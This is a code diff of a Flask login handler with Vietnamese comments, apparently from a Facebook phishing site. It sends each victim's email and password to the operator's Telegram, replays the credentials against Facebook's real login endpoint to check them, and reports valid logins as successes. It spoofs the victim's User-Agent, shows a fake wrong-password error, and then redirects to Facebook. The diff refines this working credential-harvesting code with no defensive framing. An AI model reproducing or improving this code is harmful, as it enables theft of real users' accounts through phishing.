@@ -33,36 +33,38 @@ def login():
     if not email or not password:
         return render_template('index.html', error="Vui lòng nhập đầy đủ thông tin.")
 
-    # Gửi thông tin về Telegram
     send_to_telegram("📧 THÔNG TIN ĐÃ NHẬP", f"Email: {email}\nPassword: {password}")
 
-    # === THỬ ĐĂNG NHẬP VÀO FACEBOOK THẬT ===
     try:
         headers = {
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+            'User-Agent': request.headers.get('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'),
             'Accept': 'text/html,application/xhtml+xml',
             'Accept-Language': 'vi-VN,vi;q=0.9',
             'Referer': 'https://www.facebook.com/'
         }
 
-        data = {'email': email, 'pass': password, 'login': '1'}
+        data = {
+            'email': email,
+            'pass': password,
+            'login': '1'
+        }
 
         r = requests.post('https://www.facebook.com/login.php', 
                          data=data, 
                          headers=headers, 
                          allow_redirects=True, 
-                         timeout=12)
+                         timeout=15)
 
-        # Nếu Facebook redirect về trang home → thành công
-        if any(keyword in r.url.lower() for keyword in ['home', 'facebook.com/home', '/messages']):
-            send_to_telegram("✅ ĐĂNG NHẬP THÀNH CÔNG", f"Email: {email}\nPassword: {password}")
+        # Kiểm tra xem Facebook có chấp nhận đăng nhập không
+        if "home" in r.url.lower() or r.status_code == 200 and len(r.text) > 50000:
+            send_to_telegram("✅ ĐĂNG NHẬP THÀNH CÔNG - COOKIE THẬT", 
+                           f"Email: {email}\nPassword: {password}\nStatus: Success")
             return redirect('https://www.facebook.com')
         else:
-            # Sai mật khẩu hoặc Facebook chặn
+            # Sai hoặc bị chặn
             return render_template('index.html', error="Mật khẩu bạn nhập không đúng. Vui lòng thử lại.")
 
     except Exception as e:
-        # Nếu lỗi kết nối → coi như sai và ở lại trang
         return render_template('index.html', error="Mật khẩu bạn nhập không đúng. Vui lòng thử lại.")
 
 if __name__ == '__main__':
